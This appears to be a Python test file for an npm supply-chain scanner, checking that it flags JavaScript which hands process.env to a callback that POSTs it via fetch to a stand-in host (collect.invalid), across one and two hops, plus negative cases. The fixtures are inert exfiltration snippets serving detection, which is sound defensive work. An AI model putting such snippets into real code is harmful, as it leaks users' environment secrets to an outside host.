"""D-19 (0.1.9): data a function hands to a callback it was given. `function withEnv(cb) {
cb(JSON.stringify(process.env)); }` then `withEnv((d) => fetch(u, { method: 'POST', body: d }))` sends the whole
environment; the supply model's tree, which reads every file under 2,000,000 characters and answers for it, ran a
built-in's callback (`forEach`, `then`) with what it was given but not a function's own parameter, so such a release
was OK. A parameter a function calls with values now runs the function a caller gives there with them
(Func::param_calls): a value the function was given itself is what the caller gives it. (Across modules the tree
follows no send yet, with a callback or without one: D-7's.)

Payloads are inert: nothing is installed or run; the addresses are `.invalid`."""
import unittest

from tests.registry._review_support import issues, manifest, scan_npm

SEND = "fetch('https://collect.invalid/c', { method: 'POST', body: %s })"


def import_risks(text):
    res = scan_npm({"package.json": manifest(main="index.js"), "index.js": text})
    return res, [(i["sev"], i["msg"]) for i in issues(res, "SC-IMPORT-RISK")]


class FoundTests(unittest.TestCase):
    def check(self, text):
        res, found = import_risks(text)
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
        self.assertEqual([sev for sev, _msg in found], ["CRITICAL"], found)
        self.assertIn("whole environment", found[0][1])

    def test_a_callback_given_the_environment(self):
        self.check("function withEnv(cb) { cb(JSON.stringify(process.env)); }\n"
                   "withEnv((d) => " + SEND % "d" + ");\n")

    def test_a_named_function_given_as_the_callback(self):
        self.check("function withEnv(cb) { const data = JSON.stringify(process.env); cb('x', data); }\n"
                   "function send(_tag, d) { " + SEND % "d" + "; }\n"
                   "withEnv(send);\n")

    def test_what_the_caller_gave_handed_on(self):
        # the function calls its callback with its own parameter: what the caller gave there
        self.check("function pass(x, cb) { setup(); cb(x); }\nfunction setup() {}\n"
                   "pass(JSON.stringify(process.env), (d) => " + SEND % "d" + ");\n")

    def test_two_hops(self):
        # the callback handed on to another function that calls it
        self.check("function inner(cb) { cb(JSON.stringify(process.env)); }\n"
                   "function outer(cb) { inner(cb); }\n"
                   "outer((d) => " + SEND % "d" + ");\n")


class NotFoundTests(unittest.TestCase):
    def check(self, text):
        res, found = import_risks(text)
        self.assertEqual(found, [])
        self.assertEqual(res["verdict"], "OK", res["verdictReason"])

    def test_a_callback_given_what_is_not_local_data(self):
        self.check("function withName(cb) { cb('lazaret'); }\nwithName((d) => " + SEND % "d" + ");\n")

    def test_a_callback_that_sends_nothing(self):
        self.check("function withEnv(cb) { cb(JSON.stringify(process.env)); }\n"
                   "withEnv((d) => console.log(d.length));\n")

    def test_the_data_given_another_parameter(self):
        # the callback is called with a constant; the environment goes elsewhere (nowhere)
        self.check("function both(cb, keep) { keep(JSON.stringify(process.env)); cb('ok'); }\n"
                   "both((d) => " + SEND % "d" + ", () => {});\n")


if __name__ == "__main__":
    unittest.main()
